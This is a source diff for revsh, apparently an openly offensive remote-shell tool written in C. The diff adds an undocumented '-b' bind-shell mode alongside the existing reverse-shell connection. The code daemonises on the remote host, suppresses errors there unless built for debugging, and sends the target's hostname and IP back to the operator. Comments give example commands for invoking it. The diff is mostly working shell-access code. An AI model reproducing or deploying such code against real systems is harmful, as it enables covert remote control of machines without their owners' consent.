@@ -161,6 +161,7 @@ int main(int argc, char **argv){
 	int rc_fd;
 	char *rc_file = NULL;
 
+	int bindshell = 0;
 
 
 	/*
@@ -170,14 +171,45 @@ int main(int argc, char **argv){
 	io.listener = 0;
 	io.encryption = EDH;
 
-	while((opt = getopt(argc, argv, "pals:k:r:")) != -1){
+	while((opt = getopt(argc, argv, "pbals:k:r:")) != -1){
 		switch(opt){
 
+			//
+			// plaintext
+			//
 			// The plaintext case is an undocumented "feature" which should be difficult to use.
 			// You will need to pass the -p switch from both ends in order for it to work.
 			// This is provided for debugging purposes only.
 			case 'p':
 				io.encryption = PLAINTEXT;
+				break;
+
+			//
+			// bindshell
+			//
+			// This is another undocumented feature, mostly because the language to describe it is
+			// too confusing for a short blurb in the README or the usage() statement.
+			// The calls to the listner (on the local host) and the connector (remote host) are the
+			// same. However, if you pass '-b' to *both* ends, the "listener" (local host) will connect
+			// outbound to the remote connector host. Technically this makes the connection a bindshell
+			// instead of a reverse shell (thus the -b flag). http://en.wikipedia.org/wiki/Shellcode#Remote
+			//
+			// E.g:
+			// 	Normal reverse shell invocation:
+			// 		local host -> "revsh -l ADDRESS PORT"
+			// 		remote host -> "revsh ADDRESS PORT"
+			//
+			// 	Bind shell invocation:
+			// 		remote host -> "revsh -b ADDRESS PORT"
+			// 		local host -> "revsh -l -b ADDRESS PORT"
+			//
+			//  (Note that the bind shell case you have to launch the remote connector first, then the local
+			//	listener secondly.)
+			//
+			// With a rant like this, I think you can see why I've chosen to leave it as "undocumented".
+			//
+			case 'b':
+				bindshell = 1;
 				break;
 
 			case 'a':
@@ -391,48 +423,69 @@ int main(int argc, char **argv){
 			}
 		}
 
-		// - Listen for a connection.
-		printf("Listening...");
-		fflush(stdout);
 
-		if((accept = BIO_new_accept(buff_head)) == NULL){
-			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
-					program_invocation_short_name, io.listener, buff_head, strerror(errno));
-			ERR_print_errors_fp(stderr);
-			exit(-1);
+		if(bindshell){
+
+			// - Open a network connection back to a listener.
+			if((io.connect = BIO_new_connect(buff_head)) == NULL){
+				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
+						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if(BIO_do_connect(io.connect) <= 0){
+				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+		}else{
+			// - Listen for a connection.
+			printf("Listening...");
+			fflush(stdout);
+
+			if((accept = BIO_new_accept(buff_head)) == NULL){
+				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
+						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
+				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if(BIO_do_accept(accept) <= 0){
+				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if(BIO_do_accept(accept) <= 0){
+				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			if((io.connect = BIO_pop(accept)) == NULL){
+				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+				exit(-1);
+			}
+
+			BIO_free(accept);
 		}
 
-		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
-			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-			ERR_print_errors_fp(stderr);
-			exit(-1);
-		}
-
-		if(BIO_do_accept(accept) <= 0){
-			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-			ERR_print_errors_fp(stderr);
-			exit(-1);
-		}
-
-		if(BIO_do_accept(accept) <= 0){
-			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-			ERR_print_errors_fp(stderr);
-			exit(-1);
-		}
-
-		if((io.connect = BIO_pop(accept)) == NULL){
-			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
-			ERR_print_errors_fp(stderr);
-			exit(-1);
-		}
-
-		BIO_free(accept);
 		printf("\tConnected!\n");
-		
+
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
 			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
 					program_invocation_short_name, io.listener, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
@@ -861,12 +914,18 @@ int main(int argc, char **argv){
 		 */
 	}else{
 
+		// Note: We will make heavy use of #ifdef DEBUG here. I don't want to *ever* print to the
+		// remote host. We can do so if debugging, but otherwise just fail silently. Once the 
+		// connection is open, we will try to shove errors down the socket, but otherwise fail
+		// silently.
+
+#ifndef DEBUG
+
 		// - Become a daemon.
 		umask(0);
 
 		retval = fork();
 
-#ifndef DEBUG
 
 		if(retval == -1){
 			error(-1, errno, "fork()");
@@ -935,23 +994,81 @@ int main(int argc, char **argv){
 			}
 		}
 
-		// - Open a network connection back to a listener.
-		if((io.connect = BIO_new_connect(buff_head)) == NULL){
-#ifdef DEBUG
-			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
-					program_invocation_short_name, io.listener, buff_head, strerror(errno));
-			ERR_print_errors_fp(stderr);
-#endif
-			exit(-1);
-		}
+		if(bindshell){
+			// - Listen for a connection.
 
-		if(BIO_do_connect(io.connect) <= 0){
 #ifdef DEBUG
-			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
-					program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
-			ERR_print_errors_fp(stderr);
+			printf("Listening...");
+			fflush(stdout);
 #endif
-			exit(-1);
+
+			if((accept = BIO_new_accept(buff_head)) == NULL){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
+						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			if(BIO_do_accept(accept) <= 0){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			if(BIO_do_accept(accept) <= 0){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			if((io.connect = BIO_pop(accept)) == NULL){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			BIO_free(accept);
+
+		}else{
+
+			// - Open a network connection back to a listener.
+			if((io.connect = BIO_new_connect(buff_head)) == NULL){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
+						program_invocation_short_name, io.listener, buff_head, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
+
+			if(BIO_do_connect(io.connect) <= 0){
+#ifdef DEBUG
+				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
+						program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
+				ERR_print_errors_fp(stderr);
+#endif
+				exit(-1);
+			}
 		}
 
 		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
@@ -1278,7 +1395,11 @@ int main(int argc, char **argv){
 		remote_printf(&io, "# hostname: %s\r\n", buff_head);
 
 		io.ip_addr = BIO_get_conn_ip(io.connect);
-		remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);
+		if(io.ip_addr){
+			remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);
+		}else if(!bindshell){
+			remote_printf(&io, "# ip address: I have no address!\r\n");
+		}
 
 		// if the uid doesn't match an entry in /etc/passwd, we don't want to crash.
 		// Borrowed the "I have no name!" convention from bash.
